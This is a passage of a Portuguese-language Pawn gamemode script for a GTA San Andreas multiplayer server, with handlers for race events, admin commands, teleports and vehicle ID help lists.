		        SendClientMessage(playerid, COR_ROXO, "Você ganha R$2000 pela rota feita.");
		        sGivePlayerCash(playerid, 2000);
		        RemovePlayerMapIcon(playerid, 90);
			}
			return 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está na área Motorista de Ônibus!");
		}
  		return 1;
	}
    if(!strcmp(cmd, "/participar", true))
	{
	    if(EventoCriado == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Não existe nenhum evento criado no momento!");
			return 1;
		}
		if(ParticipandoEvento[playerid] == 1)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você já está participando do evento!");
		    return 1;
		}
		if(vOcupados == VeiculosEvento)
		{
		    SendClientMessage(playerid, COR_ERRO, "Já excedeu o limite de players no evento!");
			return 1;
		}
	  	new
		  	TCP
		;
		if(TipoCheckPoint == 1)
		{
			TCP = 0;
		}
		else if(TipoCheckPoint == 2)
		{
			TCP = 3;
		}
		if(vOcupados < VeiculosEvento)
		{
		    SendClientMessage(playerid, COR_AMARELO, "Você agora está participando do evento. Boa sorte!");
			PutPlayerInVehicle(playerid, vEvento[vOcupados], 0);
			vOcupou[playerid] = vEvento[vOcupados];
			vOcupados ++;
			ParticipandoEvento[playerid] = 1;
        	TextDrawShowForPlayer(playerid, text_Top5[0]);
			TextDrawShowForPlayer(playerid, text_Top5[1]);
			SetPlayerRaceCheckpoint(playerid, TCP, CheckPoint[SetPlayerCheckPoint[playerid]][0], CheckPoint[SetPlayerCheckPoint[playerid]][1], CheckPoint[SetPlayerCheckPoint[playerid]][2], CheckPoint[SetPlayerCheckPoint[playerid] +1][0], CheckPoint[SetPlayerCheckPoint[playerid] + 1][1], CheckPoint[SetPlayerCheckPoint[playerid] +1][2], 8.0);
		}
	    return 1;
	}
	if(GetPVarInt(playerid, "pAdmin") == 1)
	{
		if(!strcmp(cmd, "/ecv", true))
		{
			if(VeiculosEvento == MAX_VEH_EVENTO)
			{
				SendClientMessage(playerid, COR_ERRO, "Foi excedido o limite de veículos por evento! (Máximo: 50)");
				return 1;
			}
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /ecv [VeiculoID]");
				return 1;
			}
			new
				veiculoID = strval(tmp)
			;
			if(veiculoID < 400 || veiculoID > 611)
			{
				SendClientMessage(playerid, COR_ERRO, "ID de veículo inexistente!");
				return 1;
			}
			new
				Float:ev_x, Float:ev_y, Float:ev_z, Float:ev_a
			;
			GetPlayerFacingAngle(playerid, ev_a);
			GetPlayerPos(playerid, ev_x, ev_y, ev_z);

			new
			    ev_c = random(360)
			;
			PutPlayerInVehicle(playerid, vEvento[VeiculosEvento] = CreateVehicle(veiculoID, ev_x, ev_y, ev_z, ev_a, ev_c, ev_c, -1), 0);
			ivEvento[vEvento[VeiculosEvento]] = 1;
   			VeiculosEvento ++;
			return 1;
		}
	 	if(!strcmp(cmd, "/evmodelo", true))
		{
   			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /evModelo [ID Veículo]");
				return 1;
			}
			new
				ev_modelo = strval(tmp)
			;
		    for(new ve = 0; ve < MAX_VEHICLES; ++ve)
			{
				if(IsValidVehicleEvento(ve))
				{
					new
						Float:vehx, Float:vehy, Float:vehz, Float:veha
					;
					GetVehiclePos(ve, vehx, vehy, vehz);
					GetVehiclePos(ve, vehx, vehy, vehz);
					GetVehicleZAngle(ve, veha);
		      		DestroyVehicle(ve);
     				new
			    		ev_c = random(360)
					;
		      		vEvento[CreateVehicle(ev_modelo, vehx, vehy, vehz, veha, ev_c, ev_c, -1)] = 1;
		    	}
			}
			return 1;
		}
	 	if(!strcmp(cmd, "/econtar", true))
		{
   			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /eContar [Segundos]");
				return 1;
			}
			new
				eSegundos = strval(tmp)
			;
			if(eSegundos < 1 || eSegundos > 60)
			{
			    SendClientMessage(playerid, COR_ERRO, "Somente segundos para iniciar uma contagem de 1 a 60!");
			    return 1;
			}
			ContagemRegressiva = eSegundos;
			eContageme();
			return 1;
		}
		if(!strcmp(cmd, "/etipo", true))
		{
			tmp = strtok(cmdtext, idx) ;
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /eTipo [1 = Terrestre | 2 = Aéreo]");
				return 1;
			}
			new
				CPT = strval(tmp)
			;
			if(CPT == 1 || CPT == 2)
			{
				if(CPT == 1)
				{
				    TipoCheckPoint = 1;
	   				SendClientMessage(playerid, COR_AMARELO, "Os checkpoints a ser criados foram definidos para corrida terrestre.");
		   		 	ClickMause[playerid] = 1;
		   		 	return 1;
				}
				else if(CPT == 2)
				{
				    TipoCheckPoint = 2;
					SendClientMessage(playerid, COR_AMARELO, "Os checkpoints a ser criados foram definidos para corrida aéreo.");
		   		 	ClickMause[playerid] = 1;
		   		 	return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Você só pode definir (1 para terrestre) ou (2 para aéreo)!");
		  		return 1;
			}
		    return 1;
		}
		if(!strcmp(cmd, "/ecriar", true))
		{
			if(EventoCarregado == 0)
	 	    {
		        SendClientMessage(playerid, COR_ERRO, "Antes você precisa carregar o evento!");
		        return 1;
		    }
		    if(EventoCriado == 1)
		    {
		        SendClientMessage(playerid, COR_ERRO, "Já tem um evento em andamento!");
		        return 1;
		    }
		    else
		    {
		        EventoCriado = 1;
		        SendClientMessage(playerid, -1, "Evento criado com sucesso!");
    		 	T_AntBug = 1;
				SetTimer("CongelarPlayers", 1000, false);
				ClickMause[playerid] = 0;
				return 1;
			}
		}
		if(!strcmp(cmd, "/ecarregar", true))
		{
		    if(CheckID < 3)
		    {
		        SendClientMessage(playerid, COR_ERRO, "Você precisa criar no mínimo 3 checkpoints!");
		        return 1;
		    }
		    EventoCarregado = 1;
			CheckMaxRaceCheckPoints(playerid);
			ClickMause[playerid] = 0;
		    return 1;
		}
		if(!strcmp(cmd, "/eparar", true))
		{
			foreach(Player, i)
			{
			    if(ParticipandoEvento[i] == 1)
			    {
			        SetPlayerInterior(i, 0);
			    	SetPlayerPos(i, 1227.4470,-1817.2300,16.5938);
			    	SetCameraBehindPlayer(i);
			    	TogglePlayerControllable(i, true);
			    	Finalizou[i] = 0;
				}
			    SetPlayerCheckPoint[i] = 0; ParticipandoEvento[i] = 0; vOcupou[i] = -1;
			    DisablePlayerRaceCheckpoint(i);
				TextDrawHideForAll(text_Top5[0]);
				TextDrawHideForAll(text_Top5[1]);
			}
		    for(new ve = 0; ve < MAX_VEHICLES; ++ve)
			{
				if(IsValidVehicleEvento(ve))
				{
		      		DestroyVehicle(ve);
		    	}
		    	ivEvento[ve] = 0;
			}
			CheckID = 0;
			MaxCheck = 0;
			UltimoCP = 0;
		 	vOcupados = 0;
		    VeiculosEvento = 0;
		    EventoCriado = 0;
		    AlguemVenceu = 0;
		    AlguemVenceu2 = 0;
		    AlguemVenceu3 = 0;
		    EventoCarregado = 0;
		    KillTimer(T_Rank);
		    RemovePlayerMapIcon(playerid, 8);
			SendClientMessage(playerid, COR_AMARELO, "Evento destruido com sucesso!");
			SendClientMessage(playerid, COR_ERRO, "Info Evento ");
			SendClientFormatAll(-1, " %s - venceu o evento em 1° lugar.", VencedorNome1);
			SendClientFormatAll(-1, " %s - venceu o evento em 2° lugar.", VencedorNome2);
			SendClientFormatAll(-1, " %s - venceu o evento em 3° lugar.", VencedorNome3);
			SendClientMessage(playerid, COR_ERRO, "Info Evento ");
		    VencedorNome1 = "Ninguém";
		    VencedorNome2 = "Ninguém";
		    VencedorNome3 = "Ninguém";
		    ClickMause[playerid] = 0;
			return 1;
		}
		if(!strcmp(cmd, "/edveiculos", true))
		{
		    for(new ve = 0; ve < MAX_VEHICLES; ++ve)
			{
				if(IsValidVehicleEvento(ve))
				{
		      		DestroyVehicle(ve);
    				vOcupados = 0;
		    		VeiculosEvento = 0;
		    		ivEvento[ve] = 0;
		    		SendClientMessage(playerid, COR_AMARELO, "Os veículos criados foram destruidos!");
		    	}
			}
			return 1;
		}
		if(!strcmp(cmd, "/evrespawn", true))
		{
		    for(new ve = 0; ve < MAX_VEHICLES; ++ve)
			{
				if(IsValidVehicleEvento(ve))
				{
	        		SetVehicleToRespawn(ve);
		    		SendClientMessage(playerid, COR_AMARELO, "Os veículos do evento foram respawnados!");
	        	}
			}
			return 1;
		}
		if(!strcmp(cmd, "/epausar", true))
		{
		    foreach(Player, i)
		    {
			    if(ParticipandoEvento[i] == 1)
			    {
			        T_AntBug = 1;
                    CongelarPlayers();
                    GameTextForPlayer(i, "~r~EVENTO PAUSADO!", 5, 1);
				}
		    }
		    return 1;
		}
	 	if(!strcmp(cmd, "/eload", true))
		{
			new
				length = strlen(cmdtext)
			;
			while((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx ++;
			}
			new
				offset = idx
			;
			new
				result[64]
			;
			while((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx ++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /eCarregar [Nome]");
				return 1;
			}
	 		new
			 	nomeEvento[24], nomeEventov[24]
		 	;
			format(nomeEvento, sizeof(nomeEvento), "eSalvos/CPS/%s.txt", result);
			format(nomeEventov, sizeof(nomeEventov), "eSalvos/VS/%s.txt", result);
			carregarRace(playerid, nomeEvento);
			carregarVeiculos(nomeEventov);
			return 1;
		}
	    if(!strcmp(cmd, "/esalvarreservado", true))
		{
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /eSalvar [Nome]");
				return 1;
			}
  			new
				nomeEvento[256]
			;
			nomeEvento = tmp;
		   	salvarRace(playerid, nomeEvento);
			return 1;
		}
		if(!strcmp(cmd, "/ercp", true))
		{
			CheckID = 0;
			MaxCheck = 0;
			UltimoCP = 0;
		    EventoCriado = 0;
		    AlguemVenceu = 0;
		    AlguemVenceu2 = 0;
		    AlguemVenceu3 = 0;
		    EventoCarregado = 0;
			SendClientMessage(playerid, COR_AMARELO, "Você restou os checkpoints, crie-os novamente!");
			return 1;
		}
		if(!strcmp(cmd, "/edt", true))
		{
			foreach(Player, i)
			{
			    if(ParticipandoEvento[i] == 1)
			    {
			        SetPlayerInterior(i, 0);
			    	SetPlayerPos(i, 1227.4470,-1817.2300,16.5938);
			    	SetCameraBehindPlayer(i);
			    	TogglePlayerControllable(i, true);
        			Finalizou[i] = 0;
				}
			    SetPlayerCheckPoint[i] = 0; ParticipandoEvento[i] = 0; vOcupou[i] = -1;
			    DisablePlayerRaceCheckpoint(i);
				TextDrawHideForAll(text_Top5[0]);
				TextDrawHideForAll(text_Top5[1]);
			}
		    for(new ve = 0; ve < MAX_VEHICLES; ++ve)
			{
				if(IsValidVehicleEvento(ve))
				{
		      		DestroyVehicle(ve);
		    	}
		    	ivEvento[ve] = 0;
			}
			CheckID = 0;
			MaxCheck = 0;
			UltimoCP = 0;
		 	vOcupados = 0;
		    VeiculosEvento = 0;
		    EventoCriado = 0;
		    AlguemVenceu = 0;
		    AlguemVenceu2 = 0;
		    AlguemVenceu3 = 0;
		    EventoCarregado = 0;
		    KillTimer(T_Rank);
		    RemovePlayerMapIcon(playerid, 8);
			SendClientMessage(playerid, COR_AMARELO, "Evento destruido com sucesso!");
		    VencedorNome1 = "Ninguém";
		    VencedorNome2 = "Ninguém";
		    VencedorNome3 = "Ninguém";
		    ClickMause[playerid] = 0;
			return 1;
		}
	 	if(!strcmp(cmd, "/ecolor", true))
		{
   			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /eColor [Cor1] [Cor2]");
				return 1;
			}
			new
				ecc1 = strval(tmp)
			;
   			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /eColor [Cor1] [Cor2]");
				return 1;
			}
			new
				ecc2 = strval(tmp)
			;
		    for(new ve = 0; ve < MAX_VEHICLES; ++ve)
			{
				if(IsValidVehicleEvento(ve))
				{
		      		ChangeVehicleColor(ve, ecc1, ecc2);
		    	}
			}
			return 1;
		}
		if(!strcmp(cmd, "/ecmds", true))
		{
			SendClientMessage(playerid, -1, "/eTipo - 1 = Race terrestre, 2 = Race áreo | eCV - Cria os veículos do evento por ID. (CRIAR FORA DO VEÍCULO!)");
			SendClientMessage(playerid, -1, "/eCarregar - Carregar o evento e faz à contagem dos CPS | eCriar - Cria o evento assim os players podem usar: /Participar");
			SendClientMessage(playerid, -1, "/eContar - Inicia à contagem do evento definido de 3 à 60 | ePausar - Pausa o evento pra retornar use: /eContar novamente");
			SendClientMessage(playerid, -1, "/edVeiculos - Destroy os veículos atualmente criados | eParar - Destroi o evento veículos e CP de quem estiver no evento");
			SendClientMessage(playerid, -1, "/eSalvar - Salva os CPs criado, somente se o evento valer a pena, exemplo: /eSalvar Race Fire\n/eLoad - Carregar um evento salvo exemplo: /eLoad Race LS");
			SendClientMessage(playerid, -1, "/eRCP - Reseta os CP's sem destruir os veículos | /edt - Destroy o evento | /evrespawn - respawn os veiculos do evento");
			return 1;
		}
	}
	if(!strcmp(cmd, "/desistir", true))
	{
		if(ParticipandoEvento[playerid] == 0)
		{
			SendClientMessage(playerid, COR_ERRO, "Você não está em um evento!");
			return 1;
		}
		SendClientMessage(playerid, COR_ERRO, "Você dessitiu do evento!");
		SetPlayerPos(playerid, 1227.4470,-1817.2300,16.5938);
		SetCameraBehindPlayer(playerid);
		DisablePlayerRaceCheckpoint(playerid);
		TextDrawHideForPlayer(playerid, text_Top5[0]);
		TextDrawHideForPlayer(playerid, text_Top5[1]);
		SetPlayerCheckPoint[playerid] = 0;
		ParticipandoEvento[playerid] = 0;
		vOcupou[playerid] = -1;
		Finalizou[playerid] = 0;
        TogglePlayerControllable(playerid, true);
		return 1;
	}
    if(!strcmp(cmd, "/novatos", true))
    {
        if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1 || aInfo[playerid][Corregedor] == 1)
        {
            SendClientMessage(playerid, COR_AZULCLARO, " Novatos online:");
            foreach(Player, i)
            {
	            if(pInfo[i][Level] == 0 && pInfo[i][Prof] == 0)
	            {
					format(gStr, sizeof(gStr), " %s [ID: %d], é novato.", PlayerName(i), i);
					SendClientMessage(playerid, COR_BRANCO, gStr);
                }
            }
            return 1;
        }
        return 1;
    }
	if(!strcmp(cmdtext, "/veiculosa"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos A ");
		SendClientMessage(playerid, COR_BRANCO, " AT-400 -> 577 Andromeda -> 592");
		SendClientMessage(playerid, COR_BRANCO, " Admiral -> 445 Alpha -> 602 Ambulan -> 416");
		SendClientMessage(playerid, COR_BRANCO, " Artict1 -> 435 Artict2 -> 450");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos A ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosb"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos B ");
		SendClientMessage(playerid, COR_BRANCO, " BF-400 -> 581 Beagle -> 511 Baggage -> 485 Bandito -> 568");
		SendClientMessage(playerid, COR_BRANCO, " Banshee -> 429 Barracks -> 433 Benson -> 499 Bfinject -> 424");
		SendClientMessage(playerid, COR_BRANCO, " Blade -> 536 Blistac -> 496 Bloodra -> 504 Bobcat -> 422");
		SendClientMessage(playerid, COR_BRANCO, " Boxburg -> 609 Boxville -> 498 Bravura -> 401 Broadway -> 575");
		SendClientMessage(playerid, COR_BRANCO, " Buccanee -> 518 Buffalo -> 402 Bullet -> 541 Bagboxb -> 607");
		SendClientMessage(playerid, COR_BRANCO, " Burrito -> 482 Bus -> 431 Bike -> 509 BMX -> 481 Bagboxa -> 606");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos B ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosc"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos C ");
		SendClientMessage(playerid, COR_BRANCO, " CopBike -> 523 Cropdust -> 512 CoastGuard -> 472");
		SendClientMessage(playerid, COR_BRANCO, " Caddy -> 457 Cadrona -> 527 Camper -> 483 Cement -> 524");
		SendClientMessage(playerid, COR_BRANCO, " Cheetah -> 411 Clover -> 542 Club -> 589 Coach -> 437");
		SendClientMessage(playerid, COR_BRANCO, " Combine -> 532 Comet -> 480 CopCarLS -> 596 CopCar -> 599");
		SendClientMessage(playerid, COR_BRANCO, " CopCarSF -> 597 CopCarLV -> 598 Cft30 -> 578 Cozer -> 486");
		SendClientMessage(playerid, COR_BRANCO, " Cargobob -> 548 Cabbie -> 438");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos C ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosd"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos D ");
		SendClientMessage(playerid, COR_BRANCO, " Dodo -> 593 Dinghy -> 473 Dumper -> 406 Duneride -> 573");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos D ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculose"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos E ");
		SendClientMessage(playerid, COR_BRANCO, " Elegant -> 507 Elegy -> 562 Emperor -> 585");
		SendClientMessage(playerid, COR_BRANCO, " Esperant -> 419 Euros -> 587 Enforcer -> 427");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos E ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosf"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos F ");
		SendClientMessage(playerid, COR_BRANCO, " Faggio -> 462 FCR-900 -> 521 Freeway -> 463 F.B.I. Ranch -> 490");
		SendClientMessage(playerid, COR_BRANCO, " F.B.I. Truck -> 528 Feltze -> 533 Firela -> 544 Firetruck -> 407");
		SendClientMessage(playerid, COR_BRANCO, " Flash -> 565 Flatbed -> 455 Forklift -> 530 Fortune -> 526");
		SendClientMessage(playerid, COR_BRANCO, " Freight -> 537 Farmtr1 -> 610 ");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos F ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosg"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos G ");
		SendClientMessage(playerid, COR_BRANCO, " Glendale -> 466 Glenshit -> 604 Greenwood -> 492 ");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos G ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosh"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos H ");
		SendClientMessage(playerid, COR_BRANCO, " Hydra -> 520 Hermes -> 474 Hotdog -> 588 ");
		SendClientMessage(playerid, COR_BRANCO, " Hotrina -> 502 Hotrinb -> 503 Hotring -> 594 ");
		SendClientMessage(playerid, COR_BRANCO, " Hustler -> 545 Huntley -> 579 Hotknife -> 434");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos H ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosi"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos I ");
		SendClientMessage(playerid, COR_BRANCO, " Infernus -> 411 Intruder -> 546");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos I ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosj"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos J ");
		SendClientMessage(playerid, COR_BRANCO, " Jester -> 559 Journey -> 508 ");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos J ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosk"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos K ");
		SendClientMessage(playerid, COR_BRANCO, " Kart -> 571");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos K ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosl"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos L ");
		SendClientMessage(playerid, COR_BRANCO, " Launch -> 595 Landstal -> 400");
		SendClientMessage(playerid, COR_BRANCO, " Leviathn -> 417 Linerun -> 403");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos L ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosm"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos M ");
		SendClientMessage(playerid, COR_BRANCO, " Marquis -> 484 Majestic -> 517 Manana -> 410 ");
		SendClientMessage(playerid, COR_BRANCO, " Merit -> 551 Mesa -> 500 Moonbeam -> 418 Mowerr -> 572");
		SendClientMessage(playerid, COR_BRANCO, " Mrwhoop -> 423 Mule -> 414 Monster -> 444 MonsterA -> 556");
		SendClientMessage(playerid, COR_BRANCO, " MonsterB -> 557 Mountain Bike -> 510 Maverick -> 487");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos M ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosn"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos N ");
		SendClientMessage(playerid, COR_BRANCO, " NRG-500 -> 522 Nevada -> 553 Nebula -> 516 Newsvan -> 582");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos N ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculoso"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos O ");
		SendClientMessage(playerid, COR_BRANCO, " Oceanic -> 467");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos O ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosp"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos P ");
		SendClientMessage(playerid, COR_BRANCO, " PCJ-600 -> 461 Pizzaboy -> 448 Predator > 430");
		SendClientMessage(playerid, COR_BRANCO, " Packer -> 443 Patriot -> 470 Peren -> 404 Petro -> 514");
		SendClientMessage(playerid, COR_BRANCO, " Phoenix -> 603 Picador -> 600 Pony -> 413 Premier -> 426");
		SendClientMessage(playerid, COR_BRANCO, " Previon -> 436 Primo -> 547 Polmav -> 497 Petrotr -> 584");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos P ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosq"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos Q ");
		SendClientMessage(playerid, COR_BRANCO, " Quad -> 471");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos Q ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosr"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos R ");
		SendClientMessage(playerid, COR_BRANCO, " Rustler -> 476 RC Barron -> 464 Reefer -> 453");
		SendClientMessage(playerid, COR_BRANCO, " Rancher -> 489 RcBandit -> 441 Rccam -> 594 ");
		SendClientMessage(playerid, COR_BRANCO, " Rctiger -> 564 RoadTrain -> 515 Regina -> 479 ");
		SendClientMessage(playerid, COR_BRANCO, " Remingtn -> 534 Rhino -> 432 Rnchlure -> 505 Rcraider -> 465");
		SendClientMessage(playerid, COR_BRANCO, " Romero -> 442 Rumpo -> 440 Raindanc -> 563 Rcgoblin -> 501");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos R ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculoss"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos S ");
		SendClientMessage(playerid, COR_BRANCO, " Sanchez -> 468 Stuntplane -> 513 Skimmer -> 460 Sparrow -> 469");
		SendClientMessage(playerid, COR_BRANCO, " Shamal -> 519 Speeder -> 452 Squalo -> 446 Sabre -> 475");
		SendClientMessage(playerid, COR_BRANCO, " Sadler -> 543 Sadlshit -> 605 Sandking -> 495 Savanna -> 567");
		SendClientMessage(playerid, COR_BRANCO, " Securica -> 428 Sentinel -> 405 Slamvan -> 535 Solair -> 458");
		SendClientMessage(playerid, COR_BRANCO, " Stafford -> 580 Stallion -> 439 Stratum -> 561 Stretch -> 409 ");
		SendClientMessage(playerid, COR_BRANCO, " Sultan -> 560 Sunrise -> 550 SuperGT -> 560 F.B.I. Van -> 601 ");
		SendClientMessage(playerid, COR_BRANCO, " Sweeper -> 574 Streak -> 538 Streakc -> 570 Seasparr -> 447");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos S ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculost"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos T ");
		SendClientMessage(playerid, COR_BRANCO, " Tropic -> 454 Tahoma -> 566 Tampa -> 499 Taxi -> 420");
		SendClientMessage(playerid, COR_BRANCO, " Topfun -> 459 Tornado -> 576 Towtruck -> 525");
		SendClientMessage(playerid, COR_BRANCO, " Trash -> 408 Tug -> 583 Turismo -> 451 Tram -> 449 ");
		SendClientMessage(playerid, COR_BRANCO, " Tugstair -> 608 ");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos T ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosu"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos U ");
		SendClientMessage(playerid, COR_BRANCO, " Uranus -> 558 Utility -> 522 Utiltr1 -> 611");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos U ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosv"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos V ");
		SendClientMessage(playerid, COR_BRANCO, " Vortex -> 539 Vincent -> 540 Virgo -> 491");
		SendClientMessage(playerid, COR_BRANCO, " Vcnmav -> 488 Voodoo -> 412");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos V ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosx"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos ");
		SendClientMessage(playerid, COR_BRANCO, " Não existe veículos com as iniciais da letra 'X'.");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos ");
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculosz"))
	{
		SendClientMessage(playerid, COR_BRANCO, " Veiculos Z ");
		SendClientMessage(playerid, COR_BRANCO, " Zr350 -> 477");
		SendClientMessage(playerid, COR_BRANCO, " Veiculos Z ");
		return 1;
	}

    if(!strcmp(cmdtext, "/entrarrc"))
    {
	    if(!PlayerToPoint(3.0, playerid, -2242.6570, 128.5913, 35.3203))
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não está no RC localizado em San Fierro!") ;
	    }
    	else
		{
			SendClientMessage(playerid, COR_AMARELO, "RC ");
		    SendClientMessage(playerid, COR_BRANCO, " Seja bem-vindo ao RC, tenha um bom divertimento!");
		    SendClientMessage(playerid, COR_AMARELO, "RC ");
		  	SetPlayerPos(playerid, -1132.2523, 1028.9613, 1345.7339);
   			SetPlayerFacingAngle(playerid, 272.8925);
   			SetPlayerInterior(playerid, 10);
     		GivePlayerWeapon(playerid, 31, 99999);
			GivePlayerWeapon(playerid, 24, 99999);
			GivePlayerWeapon(playerid, 29, 99999);
			GivePlayerWeapon(playerid, 27, 99999);
			GivePlayerWeapon(playerid, 34, 99999);
			GameRC[playerid] = 1;
		}
        return 1;
    }
    if(!strcmp(cmdtext, "/sairrc"))
    {
        if(GameRC[playerid] == 0)
        {
            SendClientMessage(playerid, COR_ERRO, "Você não está no dentro do RC localizado em San Fierro!");
        }
        else
        {
			SendClientMessage(playerid, COR_AMARELO, "RC ");
		    SendClientMessage(playerid, COR_BRANCO, " Você saiu do RC, volte sempre!");
		    SendClientMessage(playerid, COR_AMARELO, "RC ");
      		SetPlayerPos(playerid, -2242.6570, 128.5913, 35.3203);
   			SetPlayerFacingAngle(playerid, 82.0435);
   			SetPlayerInterior(playerid, 0);
   			GameRC[playerid] = 0;
   			ResetPlayerWeapons(playerid);
   			SetPlayerArmas(playerid);
        }
		return 1;
    }
    if(!strcmp(cmdtext, "/GPSPlayer"))
    {
     	format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
	   	if(WE_GetInt(gFile, "GPSPlayer") == 1 || aInfo[playerid][Admin] == 1)
	    {
	        SendClientMessage(playerid, COR_AMARELO, "GPSPlayer comandos: /GPSPlayer [ID] = Localiza um jogador | /GPSPlayer desligar = Desliga o GPSPlayer.");
	        return 1;
        }
        else
        {
            SendClientMessage(playerid, COR_ERRO, "Você não tem um GPSPlayer");
            return 1;
        }
    }
    if(!strcmp(cmdtext, "/irrc"))
    {
	   	if(aInfo[playerid][Admin] == 1)
	    {
			SetPlayerPos(playerid, -1079.99, 1061.58, 1343.04);
			SetPlayerInterior(playerid, 10);
			SetPlayerVirtualWorld(playerid, 0);
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/irliberty"))
	{
	   	if(aInfo[playerid][Admin] == 1)
	    {
			SetPlayerPos(playerid, -729.276000, 503.086944, 1371.971801);
			SetPlayerInterior(playerid, 1);
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/irracha"))
	{
	   	if(aInfo[playerid][Admin] == 1)
	    {
	 		SetPlayerPos(playerid, -1383.3949, -144.4715, 1051.1080);
			SetPlayerInterior(playerid, 7);
		}
		return 1;
	}
	if(!strcmp(cmd, "/pconsertar", true))
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1)
		{
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /pConsertar [ID]");
				return 1;
			}
			new
				id = strval(tmp)
			;
			if(IsPlayerConnected(id))
			{
			    SendClientFormat(id, AZUL_WE, "%s desvirou e consertou seu veículo.", PlayerName(playerid));
